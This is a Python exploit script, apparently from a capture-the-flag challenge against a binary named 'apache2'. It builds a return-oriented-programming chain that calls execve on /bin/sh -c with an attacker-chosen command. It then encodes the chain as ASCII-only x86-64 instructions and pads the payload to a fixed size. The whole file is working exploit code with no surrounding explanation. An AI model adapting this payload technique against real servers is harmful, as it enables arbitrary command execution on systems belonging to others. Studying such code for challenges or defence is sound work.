from ptrlib import *

elf = ELF("./apache2")

def ascii_encode(proc_base):
    rop_xchg_eax_ebp = proc_base + 0x00054615
    rop_pop_rdi = proc_base + 0x00037bd7
    rop_pop_rsi = proc_base + 0x00038d16
    rop_pop_rdx_rbx = proc_base + 0x00046eef
    rop_pop_rbp = proc_base + 0x0003713f
    rop_mov_prsi_rdi = proc_base + 0x0006e170
    rop_syscall = proc_base + 0x0004662c
    addr_arg0 = proc_base      # /bin/sh
    addr_arg1 = proc_base + 10 # -c
    addr_arg2 = proc_base + 13 # command
    addr_args = proc_base + elf.section(".bss") + 0x100

    ropchain = [
        # write args
        rop_pop_rsi,
        addr_args,
        rop_pop_rdi,
        addr_arg0,
        rop_mov_prsi_rdi,
        rop_pop_rsi,
        addr_args + 8,
        rop_pop_rdi,
        addr_arg1,
        rop_mov_prsi_rdi,
        rop_pop_rsi,
        addr_args + 0x10,
        rop_pop_rdi,
        addr_arg2,
        rop_mov_prsi_rdi,
        rop_pop_rsi,
        addr_args + 0x18,
        rop_pop_rdi,
        0,
        rop_mov_prsi_rdi,

        # execve("/bin/bash", {"/bin/bash", "-c", "..."})
        rop_pop_rdx_rbx,
        0, 0,
        rop_pop_rsi,
        addr_args,
        rop_pop_rdi,
        addr_arg0,
        rop_pop_rbp,
        59,
        rop_xchg_eax_ebp,
        rop_syscall
    ]

    encoder = [
        # rdx=0x0, rcx=0x80
        'push rax',
        'pop rdx',
        'xor al, 8',
        'push rax',
        'imul eax, [rsp], 0x10',
        'push rax',
        'pop rcx',
    ]

    for gadget in ropchain[::-1]:
        encoder += ['push rdx']
        for i in range(8):
            v = (gadget >> (i * 8)) & 0xff
            if v == 0: continue
            if v >= 0x80:
                encoder += [
                    'push rcx',
                    'pop rax',
                    'xor al, {}'.format(v ^ 0x80),
                    'xor [rsp+{}], al'.format(i)
                ]
            else:
                encoder += [
                    'push rdx',
                    'pop rax',
                    'xor al, {}'.format(v),
                    'xor [rsp+{}], al'.format(i)
                ]

    binary = nasm('\n'.join(encoder), bits=64)
    if len(binary) % 2 != 0:
        binary += b'\x35\x44\x44\x44\x44' # xor eax, 0x44444444
    binary += b'\x34\x77' * ((0x630 - len(binary)) // 2) # xor al, 0x77
    return binary[:-1] # null termination
